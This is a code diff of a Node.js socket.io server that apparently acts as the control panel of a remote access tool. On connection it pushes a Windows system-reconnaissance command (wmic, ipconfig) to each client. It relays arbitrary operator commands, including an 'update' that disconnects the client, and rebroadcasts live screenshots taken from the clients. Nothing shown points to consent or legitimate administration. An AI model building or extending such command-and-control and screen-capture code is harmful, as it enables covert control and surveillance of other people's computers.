@@ -62,7 +62,9 @@ app.use(
     saveUninitialized: true,
     cookie: {
       secure: false,
+      maxAge: 7200000,
     }, //Remember to set it to true!
+
   })
 );
 // app.get('*', render.errorHandler);
@@ -200,7 +202,7 @@ io.on("connection", (socket) => {
     socket.version = msg;  //-- for client version 1.1
 
     console.log("Dolaczono: " + socket.name + " " + socket.ip);
-    socket.emit("command", "systeminfo");
+    socket.emit("command", 'wmic computersystem get name, TotalPhysicalMemory /Value && wmic os get caption /Value && ipconfig | find "IPv4" | find /N ":"  | find "[1]"');
   });
 
   socket.on("logs", async (msg) => {
@@ -221,6 +223,9 @@ io.on("connection", (socket) => {
       console.log(`Aktualny delay: ${delay}`);
       delay -= 1;
       io.sockets.sockets.get(msg.id).emit("delay", delay);
+    } else if (msg.cmd == "update") {
+      io.sockets.sockets.get(msg.id).emit("command", msg.cmd);
+      io.sockets.sockets.get(msg.id).disconnect();
     } else {
       try {
         io.sockets.sockets.get(msg.id).emit("command", msg.cmd);
@@ -244,39 +249,12 @@ io.on("connection", (socket) => {
   });
 
   socket.on("screenshotResult", async (msg) => {
-    //console.log(msg);
-    // var d = new Date(),
-    //   dformat =
-    //     [d.getMonth() + 1, d.getDate(), d.getFullYear()].join("_") +
-    //     "-" +
-    //     [d.getHours(), d.getMinutes(), d.getSeconds()].join("_");
-    //const buffer = Buffer.from(msg, "base64");
     fps += 1;
 
     io.emit("screenshotResult", {
       id: socket.id,
       response: msg,
     });
-
-    // sharp(Buffer.from(msg, 'base64'))
-    // .jpeg({quality: 20})
-    // .resize({width: 1280, height: 720})
-    // .toBuffer((err, buffer) => {
-    //   if (err) {
-    //     console.error(err);
-    //   } else {
-    //     // The resized and compressed image data is now in the `buffer` variable
-    //     io.emit("screenshotResult", {
-    //       id: socket.id,
-    //       response: buffer.toString('base64'),
-    //     });
-    //   }
-    // });
-
-    // fs.writeFileSync(
-    //   `./clients/${socket.name}/screenshots/screenshot-${dformat}.jpg`,
-    //   buffer
-    // );
   });
 
   socket.on("delete", async (msg) => {
@@ -308,25 +286,29 @@ io.on("connection", (socket) => {
 
 function parseClientInfo(decodedString, socket) {
   const outputLines = decodedString.split("\n");
-  const osNameLine = outputLines.find((line) => line.startsWith("OS Name:"));
-  const osName = osNameLine.split(":")[1].trim();
+  const osNameLine = outputLines.find((line) => line.startsWith("Caption="));
+  const osName = osNameLine.split("=")[1].trim();
   const hostNameLine = outputLines.find((line) =>
-    line.startsWith("Host Name:")
+    line.startsWith("Name=")
   );
-  const hostName = hostNameLine.split(":")[1].trim();
+  const hostName = hostNameLine.split("=")[1].trim();
   const ramLine = outputLines.find((line) =>
-    line.startsWith("Total Physical Memory:")
+    line.startsWith("TotalPhysicalMemory=")
   );
-  const ram = ramLine.split(":")[1].trim().replace("�", "");
+  const ram = formatBytes(parseInt(ramLine.split("=")[1].trim()))
+  const ipLine = outputLines.find((line) =>
+  line.startsWith("[1]")
+);
+const ip = ipLine.split(":")[1].trim()
 
 
   
-  const ipAddress = decodedString.match(/IP address[^:]+: (.*)/)[1];
+  //const ipAddress = decodedString.match(/IP address[^:]+: (.*)/)[1];
   socket.name = hostName;
   clients.push({
     id: socket.id,
     name: hostName,
-    ip: ipAddress,
+    ip: ip,
     ram: ram,
     version: socket.version,
     system: osName,
@@ -377,18 +359,12 @@ function formatBytes(bytes, decimals = 2) {
 
   return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`
 }
-function getFilesize(path, decimals = 2) {
+function getFilesize(path) {
   var stats = fs.statSync(path);
   var bytes = stats.size;
-  if (!+bytes) return '0 Bytes'
 
-  const k = 1024
-  const dm = decimals < 0 ? 0 : decimals
-  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB']
 
-  const i = Math.floor(Math.log(bytes) / Math.log(k))
-
-  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`
+  return formatBytes(bytes)
 }
 
 exports.clients = clients;
